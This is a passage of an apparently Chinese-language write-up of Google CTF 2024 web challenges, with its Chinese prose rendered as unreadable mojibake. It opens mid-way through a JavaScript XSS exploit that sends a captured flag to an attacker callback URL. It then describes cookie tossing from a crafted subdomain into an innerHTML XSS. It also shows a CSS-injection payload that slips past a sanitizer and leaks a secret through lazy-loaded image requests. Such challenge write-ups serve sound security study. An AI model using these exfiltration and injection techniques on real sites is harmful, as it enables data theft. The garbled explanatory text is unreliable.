&#125;)                    &#125;                    win.frames[0].Blob = function(a) &#123;                      fetch('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>callbackUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/ping')                      fetch('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>callbackUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/flag', &#123; method: 'POST', body: a &#125;)                    &#125;                  &#125; catch (err) &#123;&#125;                &#125;, 2)              &#125;, 500)            &#125;            </span><span class="token template-punctuation string">`</span></span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>          <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/start'</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">getSandboxXss</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸºæœ¬ä¸Šå°±æ˜¯é–‹ä¸‰å€‹ intervalï¼Œä¸€å€‹æ›´æ–°æˆ <code>#0</code>ï¼Œä¸€å€‹æ›´æ–°æˆæˆ‘å€‘è¦çš„æ¨£å­ï¼Œå¦ä¸€å€‹å‰‡æ˜¯ä¸æ–·å»è¦†è“‹ flag iframe çš„å‡½å¼ã€‚è§€å¯Ÿå¾Œç™¼ç¾æœ‰æˆåŠŸ XSS å¹¾æ¬¡ï¼Œä½†å°±æ²’æœ‰å¾ŒçºŒäº†ï¼Œè¦å˜›æ˜¯ code å¯«å£ï¼Œè¦å˜›æ˜¯ modal é—œæ‰äº†æ‰€ä»¥ä¾†ä¸åŠã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œæˆ‘è‡ªå·±é‚„åœ¨å˜—è©¦çš„æ™‚å€™ï¼ŒéšŠå‹å°±åšå‡ºä¾†äº†ï¼Œæ¦‚å¿µå·®ä¸å¤šï¼Œå”¯ä¸€çš„å·®åˆ¥å¤§æ¦‚æ˜¯ interval çš„æ•¸å­—é‚„æœ‰æœ€å¾Œæ‹¿ flag çš„æ–¹æ³•ã€‚</p><p>é›–ç„¶èªª flag å…§å®¹æ˜¯ sandboxed iframeï¼Œä½†æ˜¯è¼‰å…¥é€™å€‹ iframe çš„ç¶²é æ˜¯ same-origin çš„ï¼Œå› æ­¤ç›´æ¥æ‹¿ iframe çš„ srcï¼ˆæœƒæ˜¯ä¸€å€‹ blobï¼‰å†å» fetch ä¸€ä¸‹å°±å¥½ï¼Œå› ç‚ºä¹Ÿæ˜¯ same-originã€‚</p><p>çµè«–ï¼šrace condition çœŸé›£ï¼Œå°±ç®—ç™¼ç¾äº†ä¹Ÿä¸ä¸€å®šæ’å¾—å‡ºä¾†ã€‚</p><p>è©±èªªå‡ºé¡Œè€… terjanq çµ¦çš„å®˜æ–¹è§£ç­”åœ¨é€™è£¡ï¼š<a href="https://github.com/google/google-ctf/tree/main/2024/quals/web-postviewer3">https://github.com/google/google-ctf/tree/main/2024/quals/web-postviewer3</a></p><p>ä¸­é–“å¤šäº†ä¸€æ­¥è¦åœ¨ <code>storage.googleapis.com</code> ä¸Šæ‰¾ä¸€å€‹ XSSï¼Œä¸éæ•´é«”æ¦‚å¿µéƒ½æ˜¯ä¸€æ¨£çš„ï¼Œåªæ˜¯å½é€ å‡º hash çš„æ–¹å¼ä¸åŒã€‚</p><h2><span id="game-arcade-14-solves">GAME ARCADE (14 solves)</span></h2><p>é€™é¡Œå…¶å¯¦è·Ÿ POSTVIEWER V3 æ»¿åƒçš„ï¼Œæœ‰è¨±å¤šç¨‹å¼ç¢¼ç”šè‡³æ˜¯å…±ç”¨æˆ–è€…æ˜¯æ”¹è‰¯ç‰ˆï¼Œå…¶å¯¦æœ‰é»ç®—å·å·åœ¨çµ¦ POSTVIEWER V3 æç¤ºï¼ˆï¼Ÿï¼‰</p><p>ç¸½ä¹‹åŠŸèƒ½å°±æ˜¯æœ‰å››å€‹å°éŠæˆ²ï¼Œé»ä¸‹å»ä¹‹å¾Œæœƒç”¨ sandbox domain + shim.htmlï¼ˆåŸºæœ¬ä¸Šå°±æ˜¯ POSTVIEWER V3 çš„é‚£å€‹ shimï¼‰è¼‰å…¥å›ºå®šçš„ HTMLã€‚</p><p>é€™é‚Šè¨ˆç®— sandbox hash çš„æ–¹æ³•è·Ÿä¹‹å‰ä¸åŒï¼Œæœƒç”¨ç‰¹æ®Šç¬¦è™Ÿé€²è¡Œ joinï¼Œæ‰€ä»¥ç„¡æ³•å½é€ ã€‚</p><p>è€Œå››å€‹å°éŠæˆ²ä¸­ï¼Œæœ‰ä¸€å€‹å¾ˆæ˜é¡¯ä¸æ˜¯éŠæˆ²ï¼Œéƒ¨åˆ†ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> password <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span> <span class="token operator">||</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"okoÅ„"</span><span class="token punctuation">;</span><span class="token keyword">let</span> correctPasswordSpan <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>correctPasswordSpan<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'correct'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>correctPasswordSpan<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> password<span class="token punctuation">;</span><span class="token keyword">let</span> steps <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">savePassword</span><span class="token punctuation">(</span><span class="token parameter">pwd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">password=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>pwd<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> pwd<span class="token punctuation">)</span>  <span class="token keyword">return</span> pwd<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">changePwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  steps <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  password <span class="token operator">=</span> passwordInp<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  correctPasswordSpan<span class="token punctuation">.</span>innerHtml <span class="token operator">=</span> password<span class="token punctuation">;</span>  output<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'Password changed.'</span><span class="token punctuation">;</span>  <span class="token function">savePassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€™é¡Œçš„ bot æœ€å¾Œæ˜¯é€é changePwd å¯«å…¥ flagï¼Œå› æ­¤ç›®æ¨™æ˜¯åŸ·è¡Œ XSSï¼Œå·åˆ°åœ¨ cookie æˆ–æ˜¯ localStorage è£¡é¢çš„ passwordã€‚</p><p>å¾ä¸Šé¢ç¨‹å¼ç¢¼ä¸­å¾ˆæ˜é¡¯å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœæˆ‘å€‘èƒ½è“‹æ‰ cookieï¼Œå°±èƒ½æœ‰å€‹ XSSã€‚</p><p>ç‚ºä»€éº¼å‘¢ï¼Ÿå› ç‚º password å¯æ§ï¼Œç„¶å¾Œ <code>correctPasswordSpan.innerHTML = password</code>ï¼Œé›–ç„¶èªª correctPasswordSpan ä¸¦æ²’æœ‰è¢«æ”¾åˆ°ç•«é¢ä¸Šï¼Œä½†å…¶å¯¦é‚„æ˜¯æœ‰ XSS çš„é¢¨éšªï¼ŒçœŸå¯¦æ¡ˆä¾‹å¯ä»¥çœ‹æˆ‘ä¹‹å‰è·Ÿ @sudi æ‰¾åˆ°çš„ figma XSSï¼š<a href="https://github.com/Sudistark/xss-writeups/blob/main/figma.com-xss.md">Interesting case of a DOM XSS in www.figma.com</a></p><p>è¦è¦†è“‹ cookie çš„è©±ï¼Œç«‹åˆ»èƒ½æƒ³åˆ°çš„å°±æ˜¯å¾å…¶ä»– domain ä¾†çš„ cookie tossingï¼Œä½†é€™é¡Œçš„è©± <code>*.usercontent.goog</code> åœ¨ public suffix è£¡é¢ï¼Œæ‰€ä»¥æ²’è¾¦æ³•å¾å…¶ä»– subdomain å¯«å…¥ã€‚</p><p>è€Œå‰›å¥½æˆ‘éšŠå‹åœ¨è§£ POSTVIEWER V3 çš„æ™‚å€™æœ‰å€‹æƒ³æ³•å¯ä»¥ç”¨åœ¨é€™è£¡ï¼Œä»–åœ¨ç•¶æ™‚å°±æäº†èªªä¸å®šå¯ä»¥æ§‹é€ ä¸€å€‹ <code>http://sbx-fake.sbx-real.postviewer3-web.2024.ctfcompetition.com/</code> çš„ domainï¼Œé›–ç„¶åœ¨é‚£é¡Œæ²’ä»€éº¼ç”¨ï¼Œä½†åœ¨é€™é¡Œå°±æ˜¯è§£ç­”äº†ã€‚</p><p>æˆ‘å€‘æƒ³å½±éŸ¿çš„ domain ç‚º <a href="https://0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog/google-ctf/shim.html">https://0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog/google-ctf/shim.html</a></p><p>å¯ä»¥æ§‹é€ å‡ºä¸€å€‹ HTTP subdomain çš„ XSSï¼š<a href="http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-h641507400.0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog/google-ctf/shim.html">http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-h641507400.0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog/google-ctf/shim.html</a></p><p>å°±å¾é€™å€‹ subdomain åš cookie tossing å°±è¡Œäº†ï¼ˆå¯¦éš›ä¸ŠçœŸçš„ domain è¦ç”¨ä½ çš„ origin å»ç®—ï¼Œä¸Šé¢åªæ˜¯å€‹ç¯„ä¾‹è­‰æ˜ subdomain å¯è¡Œï¼‰ã€‚</p><p>ä½œè€…çš„ writeup åœ¨é€™ï¼š<a href="https://github.com/google/google-ctf/tree/main/2024/quals/web-game-arcade">https://github.com/google/google-ctf/tree/main/2024/quals/web-game-arcade</a> </p><p>çœ‹äº†ä¹‹å¾Œæ‰çŸ¥é“åŸä¾† Chrome åœ¨ blob è£¡é¢æ²’è¾¦æ³•ä½¿ç”¨ cookieã€‚</p><p>å¦å¤–ï¼Œæˆ‘ä¹Ÿè·Ÿä½œè€…ä¸€æ¨£å¥½å¥‡ç‚ºä»€éº¼é€™é¡Œæ˜æ˜æ¯”è¼ƒç°¡å–®ï¼Œä½†æ˜¯è§£å‡ºä¾†çš„éšŠä¼å»æ¯”è¼ƒå°‘ï¼Œæˆ‘çŒœå¯èƒ½æ˜¯æ²’æƒ³åˆ°å¯ä»¥æ§‹é€ ä¸€å€‹ subdomain å§ï¼Ÿå¦‚æœä¸æ˜¯éšŠå‹æé†’çš„è©±ï¼Œæä¸å¥½æˆ‘ä¹Ÿæƒ³ä¸åˆ°ã€‚</p><h2><span id="in-the-shadows-5-solves">IN-THE-SHADOWS (5 solves)</span></h2><p>é€™é¡Œçš„æ ¸å¿ƒç¨‹å¼ç¢¼éå¸¸ç°¡å–®ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">UNSAFE_CSS_REGEX</span> <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(@import|url[(])</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">;</span><span class="token comment">/** * @param &#123;string&#125; stylesheetText */</span><span class="token keyword">function</span> <span class="token function">sanitizeStyleSheet</span><span class="token punctuation">(</span><span class="token parameter">stylesheetText</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Early exit for imports and external URLs</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">UNSAFE_CSS_REGEX</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>stylesheetText<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> sheet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CSSStyleSheet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  sheet<span class="token punctuation">.</span><span class="token function">replaceSync</span><span class="token punctuation">(</span>stylesheetText<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> sheet<span class="token punctuation">.</span>cssRules<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> rule <span class="token operator">=</span> sheet<span class="token punctuation">.</span>cssRules<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">shouldDeleteRule</span><span class="token punctuation">(</span>rule<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      sheet<span class="token punctuation">.</span><span class="token function">deleteRule</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> safeCss <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>sheet<span class="token punctuation">.</span>cssRules<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=></span> r<span class="token punctuation">.</span>cssText<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Do the check again if somehow @import or url() reappears during re-serialization.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">UNSAFE_CSS_REGEX</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>safeCss<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> safeCss<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * @param &#123;CSSRule&#125; rule * @returns &#123;boolean&#125; */</span><span class="token keyword">function</span> <span class="token function">shouldDeleteRule</span><span class="token punctuation">(</span><span class="token parameter">rule</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSImportRule</span> <span class="token operator">||</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSMediaRule</span> <span class="token operator">||</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSFontFaceRule</span> <span class="token operator">||</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSLayerBlockRule</span> <span class="token operator">||</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSLayerStatementRule</span> <span class="token operator">||</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSNamespaceRule</span> <span class="token operator">||</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSSupportsRule</span> <span class="token operator">||</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSPageRule</span> <span class="token operator">||</span>    rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSPropertyRule</span>  <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// :has, :before etc. are potentially dangerous.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>rule <span class="token keyword">instanceof</span> <span class="token class-name">CSSStyleRule</span> <span class="token operator">&amp;&amp;</span> rule<span class="token punctuation">.</span>selectorText<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç°¡å–®ä¾†èªªå‘¢ï¼Œä½ èƒ½å¤ åœ¨ä¸€å€‹ shadow DOM è£¡é¢æ’å…¥ <code>&lt;style&gt;</code> æ¨™ç±¤ï¼Œä½†æ˜¯æ¨™ç±¤çš„å…§å®¹æœƒè¢«ä¸Šé¢çš„è¦å‰‡éæ¿¾æ‰ï¼Œè€Œç›®æ¨™æ˜¯è¦å·åˆ° parent body å±¬æ€§çš„ secretï¼Œæ ¼å¼é¡ä¼¼æ–¼ï¼š<code>00ae32216ba630c797e19594d51fc2da0b5b7d6600000000e56c64a39f94843840757e667798110efb32fac16789565d66efb62c4a0492c6</code></p><p>ä¸€é–‹å§‹åœ¨çœ‹é€™é¡Œçš„æ™‚å€™ï¼Œå¾ˆæ˜é¡¯å°±æ˜¯è¦ç”¨ CSS injection å»æŠŠæ±è¥¿å·å‡ºä¾†ï¼Œè€Œæœ‰å…©å€‹é›£é»ï¼š</p><ol><li>å¦‚ä½•å·åˆ° shadow DOM ä»¥å¤–çš„å…ƒç´ </li><li>å¦‚ä½•ç¹é sanitizer</li></ol><p>é€™é¡Œä¸€é–‹å§‹æ˜¯éšŠå‹å…ˆçœ‹çš„ï¼Œç¬¬ä¸€å€‹å•é¡Œå¯ä»¥ç”¨ <code>:host-context(body[secret^=&quot;00&quot;])</code> ä¾†è§£ï¼Œç”¨é€™å€‹ selector å¯ä»¥é¸åˆ° shadow DOM ä¹‹å¤–çš„æ±è¥¿ã€‚</p><p>è€Œç¬¬äºŒé¡Œçš„è©±ï¼Œå¯ä»¥ç”¨é™¤äº†è¢«å°é–çš„é‚£äº› rule ä»¥å¤–çš„è¦å‰‡ï¼Œä¾‹å¦‚èªª <code>@scope</code> æˆ–æ˜¯ <code>@container</code>ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">.container</span><span class="token punctuation">&#123;</span>    <span class="token property">container-type</span><span class="token punctuation">:</span> inline-size<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token atrule"><span class="token rule">@container</span> <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>    <span class="token selector">:host-context(body[secret^="00"]) p</span> <span class="token punctuation">&#123;</span>       <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹‹æ‰€ä»¥å¯ä»¥é é€™æ¨£ç¹éï¼Œæ˜¯å› ç‚ºåœ¨æª¢æŸ¥è¦å‰‡æ™‚ä¸¦ä¸æ˜¯éè¿´æª¢æŸ¥ï¼Œåªæœƒæª¢æŸ¥æœ€ä¸Šå±¤ï¼Œå› æ­¤åªè¦æŠŠ selector è—åœ¨ <code>@container</code> è£¡é¢ï¼Œå°±ä¸æœƒè¢«æª¢æŸ¥åˆ°ã€‚</p><p>è§£æ±ºé€™å…©å€‹å•é¡Œä¹‹å¾Œï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦æŠŠæ±è¥¿å·å‡ºä¾†äº†ã€‚</p><p>å› ç‚º <code>@import</code> è·Ÿ <code>url</code> éƒ½è¢«å°ä½äº†ï¼Œæ‰€ä»¥æ²’è¾¦æ³•åªé  CSS ä¾† leakï¼Œéœ€è¦é  HTML çš„å¹«åŠ©ï¼Œä¾‹å¦‚èªªæœ€å¸¸ç”¨çš„ lazy-loading imageã€‚</p><p>æŠŠä¸€å€‹ img å…ˆè¨­æˆ <code>display:none</code> ä¸¦ä¸”åŠ ä¸Š <code>loading=lazy</code>ï¼Œå°±ä¸æœƒç™¼å‡ºè«‹æ±‚ã€‚æ¥è‘—ç”¨ CSS è¨­å®šæˆ <code>display:block</code>ï¼Œå°±æœƒç™¼å‡ºè«‹æ±‚ï¼ˆæˆ‘è¨˜å¾—ä»¥å‰æˆ‘ä¹Ÿè©¦éï¼Œä½†ä¸ç®¡æ€æ¨£éƒ½æœƒç™¼å‡ºè«‹æ±‚ï¼Œè¦å˜›æ˜¯æˆ‘è¨˜éŒ¯ï¼Œè¦å˜›æ˜¯ Chrome ä¸­é–“æœ‰æ”¹éæ©Ÿåˆ¶ï¼‰</p><p>å› æ­¤å‘¢ï¼Œå°±å¯ä»¥æ ¹æ“šé€™ä¸€é»ä¾†ç”¢ç”Ÿ payloadï¼Œå¤§è‡´çš„å…§å®¹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">img</span> <span class="token punctuation">&#123;</span>    <span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token selector">.container</span><span class="token punctuation">&#123;</span>    <span class="token property">container-type</span><span class="token punctuation">:</span> inline-size<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token atrule"><span class="token rule">@container</span> <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>    <span class="token selector">:host-context(body[secret*="00"])</span><span class="token punctuation">&#123;</span>       <span class="token selector">.i00</span><span class="token punctuation">&#123;</span> <span class="token property">display</span><span class="token punctuation">:</span>flex<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">:host-context(body[secret*="01"])</span><span class="token punctuation">&#123;</span>       <span class="token selector">.i01</span><span class="token punctuation">&#123;</span> <span class="token property">display</span><span class="token punctuation">:</span>flex<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>i00</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>lazy</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>URL?i00<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>i01</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>lazy</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>URL?i01<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸éé€™é¡Œçš„ payload æœ‰å­—æ•¸é™åˆ¶ï¼Œç¶“éå¯¦æ¸¬ä¹‹å¾Œï¼Œç™¼ç¾æœ€å¤šå¤§æ¦‚åªèƒ½æœ‰ 13000 å€‹å­—å…ƒå·¦å³ï¼Œå¾ˆæ˜é¡¯æ˜¯ä¸å¤ ç”¨çš„ã€‚</p><p>æˆ‘å€‘æƒ³ leak å‡º bigramï¼Œå› æ­¤éœ€è¦ 00 åˆ° ff ä¸€å…± 256 å€‹ï¼Œ13000 &#x2F; 256 &#x3D; 50ï¼Œéµå®šæœƒéœ€è¦çš„ <code>:host-context(body[secret*=&quot;00&quot;])&#123;&#125;</code> å°±å·²ç¶“ 35 å€‹å­—äº†ï¼Œåªå‰©ä¸‹ 15 å€‹å­—ï¼Œé™¤éæœ‰ url å¯ä»¥ç”¨ï¼Œå¦å‰‡åšä¸åˆ°ã€‚</p><p>ï¼ˆè©±èªª CSS spec è£¡é¢æœ‰å€‹ <a href="https://drafts.csswg.org/css-values/#urls">src()</a>ï¼Œçœ‹èµ·ä¾†æ˜¯ url 